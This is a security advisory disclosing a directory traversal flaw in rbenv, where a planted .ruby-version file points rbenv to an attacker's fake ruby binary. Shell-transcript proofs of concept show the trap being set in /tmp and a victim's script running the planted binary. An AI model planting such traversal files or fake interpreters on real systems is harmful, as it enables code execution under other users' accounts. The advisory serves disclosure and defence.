The following issue constitutes a low-risk arbitrary code execution
vulnerability in rbenv.

No fixed version is currently available. An issue has been logged with the
project to address this vulnerability at
<https://github.com/rbenv/rbenv/issues/977>

rbenv manages multiple versions of Ruby, which are installed within a user's
home directory, and provides automatic switching between those Ruby versions
based on an application's needs.

<https://github.com/rbenv/rbenv/blob/master/README.md> says:

> At a high level, rbenv intercepts Ruby commands using shim executables
> injected into your PATH, determines which Ruby version has been specified by
> your application, and passes your commands along to the correct Ruby
> installation.

All examples below were captured using rbenv version 1.1.0-2-g4f8925a

CVE-2017-TBA rbenv Ruby specification directory traversal
---------------------------------------------------------

* OVE ID: OVE-20170303-0004
* Public disclosure date: 2017-03-04
* Affected versions: All?

When executing Ruby or a Ruby script, rbenv reads a file named `.ruby-version`
to determine the version of Ruby interpreter to execute. It will walk up the
directory tree until it finds such a file, or until it reaches `/`. If it does
not find such a file, it repeats the process starting from `$PWD`.
Documentation regarding this process is available at
<https://github.com/rbenv/rbenv/blob/master/README.md#choosing-the-ruby-version>

Once a Ruby version has been identified,
`~/.rbenv/versions/${VERSION}/bin/ruby` is used to provide Ruby.

The Ruby version specified in `.ruby-version` may contain path traversal
sequences, making it possible to specify that a `ruby` binary outside of the
user's home directory should be used to provide Ruby.

This is exploitable against local users in the following cases:

* Where a user executes a trustworthy Ruby script that is in a directory where
  the first `.ruby-version` encountered while walking upwards from the
  directory to the root directory is attacker-controlled. For example, an
  attacker may plant `/tmp/.ruby-version` to exploit a user who is executing
  `/tmp/foo/bar/fizzbuzz.rb`

* Where a user executes a trustworthy Ruby script while their `$PWD` is a
  directory where the first `.ruby-version` encountered while walking upwards
  from the directory to the root directory is attacker-controlled. For example,
  an attacker may plant `/tmp/.ruby-version` to exploit a user who is executing
  a Ruby script while they are `cd`'d to `/tmp/fizz/buzz/`

These attack scenarios are considered by the author to be highly unusual and
requires a high level of user interaction (executing Ruby scripts from, or
while `cd`'d to, a world-writable directory or a descendent thereof). This
issue is hence deemed to be low-risk.

### POC

#### Exploit a user running a Ruby script that is within `/tmp`

Create an innocent script:

```text
[justin@116e71652cf1 D ~]% mkdir -p /tmp/foo/bar/

[justin@116e71652cf1 D ~]% cat > /tmp/foo/bar/fizzbuzz.rb
#!/usr/bin/env ruby
puts 'This is fine'
^D

[justin@116e71652cf1 D ~]% chmod u+x /tmp/foo/bar/fizzbuzz.rb
```

Set the trap as `nobody`:

```text
[justin@116e71652cf1 D ~]% cat | sudo -u nobody tee /tmp/.ruby-version >/dev/null
../../../../../../../../../../../../tmp/badruby
^D

[justin@116e71652cf1 D ~]% sudo -u nobody mkdir -p /tmp/badruby/bin

[justin@116e71652cf1 D ~]% cat | sudo -u nobody tee /tmp/badruby/bin/ruby >/dev/null
#!/bin/sh
echo "Bad ruby executing as $(id)"
^D

[justin@116e71652cf1 D ~]% sudo -u nobody chmod -R a+rx /tmp/badruby

[justin@116e71652cf1 D ~]% ls -la /tmp/.ruby-version /tmp/badruby/bin/ruby
-rw-r--r-- 1 nobody nogroup 48 Mar  3 23:54 /tmp/.ruby-version
-rwxr-xr-x 1 nobody nogroup 45 Mar  3 23:55 /tmp/badruby/bin/ruby
```

Trigger the trap by executing the trustworthy script as `justin`:

```text
[justin@116e71652cf1 D ~]% /tmp/foo/bar/fizzbuzz.rb
Bad ruby executing as uid=31337(justin) gid=31337(justin) groups=31337(justin),27(sudo)
```

#### Exploit a user running a Ruby script while their `$PWD` is within `/tmp`

Create an innocent script within `~`:

```text
[justin@116e71652cf1 D ~]% mkdir -p ~/fizz/buzz

[justin@116e71652cf1 D ~]% cat > ~/fizz/buzz/foobar.rb
#!/usr/bin/env ruby
puts 'This is fine'
^D

[justin@116e71652cf1 D /tmp/fizz/buzz]% chmod u+x ~/fizz/buzz/foobar.rb 
```

`cd` to an empty directory within `/tmp`:

```text
[justin@116e71652cf1 D ~]% mkdir -p /tmp/fizz/buzz

[justin@116e71652cf1 D ~]% cd /tmp/fizz/buzz

[justin@116e71652cf1 D /tmp/fizz/buzz]% ls -la
total 8
drwxr-xr-x 2 justin justin 4096 Mar  4 00:00 .
drwxr-xr-x 3 justin justin 4096 Mar  4 00:00 ..
```

Don't bother setting the trap as `nobody` - the trap from the previous POC will
work just fine.

Trigger the trap by executing the trustworthy script as `justin`:

```text
[justin@116e71652cf1 D /tmp/fizz/buzz]% ~/fizz/buzz/foobar.rb 
Bad ruby executing as uid=31337(justin) gid=31337(justin) groups=31337(justin),27(sudo)
```

---

Justin Steven

<https://twitter.com/justinsteven>
